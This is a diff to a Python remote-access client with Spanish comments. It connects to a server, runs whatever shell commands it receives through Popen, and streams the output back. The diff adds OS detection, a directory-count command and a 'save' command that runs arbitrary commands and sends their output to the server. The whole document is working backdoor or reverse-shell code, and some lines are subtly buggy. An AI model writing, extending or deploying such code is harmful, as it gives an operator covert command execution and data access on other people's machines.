@@ -6,6 +6,7 @@ import pickle
 import struct
 import requests
 import cv2
+import platform
 from time import sleep
 from subprocess import Popen, PIPE
 from zipfile import ZipFile
@@ -23,6 +24,7 @@ class TCP:
         self.__port = port
         # chunk --> 4MB para enviar informacion
         self.__chunk = 4194304
+        self.__myOs = platform.system().lower()
 
     def conectar(self):
         # Se inicia el ciclo para crear la conexion
@@ -574,7 +576,7 @@ class TCP:
         else:
             self.__sock.send(f"error: Directorio \"{directorio}\" no encontrado".encode())
 
-    # Funcion para descargar archivo web
+    # Funcion para descargar archivos web
     # cmd --> comando recibido
     def wget(self, cmd):
         extensiones = ["jpg", "png", "jpeg", "webp", "svg", "mp4", "avi", "mkv", "mp3", "txt", "dat",
@@ -613,6 +615,63 @@ class TCP:
 
         except:
             self.__sock.send(f"error: Error al descargar el archivo".encode())
+
+    # Funcion para enviar al servidor la cantidad de elementos de un directorio
+    # cmd --> comando recibido
+    def lenDir(self, cmd):
+        directorio = re.findall("-p[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+        if os.path.isdir(directorio):
+            self.__sock.send("ok".encode())
+            cont = 0
+            sleep(0.1)
+
+            # Cuenta los archivos
+            if re.search("-f[= ]", cmd):
+                for i in os.listdir(directorio):
+                    archivo = f"{directorio}/{i}"
+                    if os.path.isfile(archivo):
+                        cont += 1
+                self.__sock.send(f"{cont} archivos encontrados".encode())
+            # Cuenta los directorios
+            elif re.search("-d[= ]", cmd):
+                for i in os.listdir(directorio):
+                    carpeta = f"{directorio}/{i}"
+                    if os.path.isdir(carpeta):
+                        cont += 1
+                self.__sock.send(f"{cont} directorios encontrados".encode())
+            # Cuenta todos los elementos
+            elif re.search("-a[= ]", cmd):
+                cont = len(os.listdir(directorio))
+                self.__sock.send(f"{cont} elementos encontrados".encode())
+            # Cuenta todos los elementos
+            else:
+                cont = len(os.listdir(directorio))
+                self.__sock.send(f"{cont} elementos encontrados".encode())
+
+        else:
+            self.__sock.send("error: Directorio \"{directorio}\" no encontrado".encode())
+
+    # Funcion para enviar a un archivo del servidor la salida de un comando
+    # cmd --> comando recibido
+    def save(self, cmd):
+        sleep(0.1)
+        if cmd[:4] == "open":
+            self.enviarDatos("No se puede almacenar informacion".encode())
+        else:
+            comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+            info = comando.stdout.read() + comando.stderr.read()
+            if self.__myOs == "linux" or self.__myOs == "darwin":
+                info = info.decode("utf-8")
+            if self.__myOs == "windows":
+                info = info.decode("cp850")
+
+            if info == b'':
+                self.__sock.send("[+] Comando ejecutado --> Salida vacia".encode())
+            else:
+                i = 0
+                while i < len(info):
+                    self.enviarDatos(info[i:i+self.__chunk].encode())
+                    i += self.__chunk
 
     # Funcion para recibir y evaluar comandos
     def shell(self):
@@ -773,25 +832,47 @@ class TCP:
                     except:
                         continue
 
+                elif cmd.lower()[:6] == "lendir":
+                    try:
+                        self.lenDir(cmd)
+
+                    except:
+                        continue
+
+                elif cmd.lower()[:4] == "save":
+                    try:
+                        cmd = cmd[5:]
+                        self.save(cmd)
+
+                    except:
+                        continue
+
                 # Si no hay una coincidencia, se ejecuta el comando
                 # y se envia lo que este regresa
                 else:
                     try:
                         if cmd.lower()[:4] == "open":
-                            os.system(cmd.lower())
+                            if self.__myOs == "linux" or self.__myOs == "darwin":
+                                os.system(cmd[:4].lower() + cmd[5:])
+                            if self.__myOs == "windows":
+                                os.system(cmd[5:])
                             self.__sock.send("[+] Comando ejecutado".encode())
 
                         else:
                             comando = Popen(cmd, shell=PIPE, stdin=PIPE, stdout=PIPE, stderr=PIPE)
                             info = comando.stdout.read() + comando.stderr.read()
+                            if self.__myOs.lower() == "linux" or self.__myOs.lower() == "darwin":
+                                info = info.decode("utf-8")
+                            if self.__myOs == "windows":
+                                info = info.decode("cp850")
 
                             if info == b'':
-                                self.__sock.send("[+] Comando ejecutado".encode())
+                                self.__sock.send("[+] Comando ejecutado --> Salida vacia".encode())
 
                             else:
                                 i = 0
                                 while i < len(info):
-                                    self.enviarDatos(info[i:i+self.__chunk])
+                                    self.enviarDatos(info[i:i+self.__chunk].encode())
                                     i += self.__chunk
 
                     except:
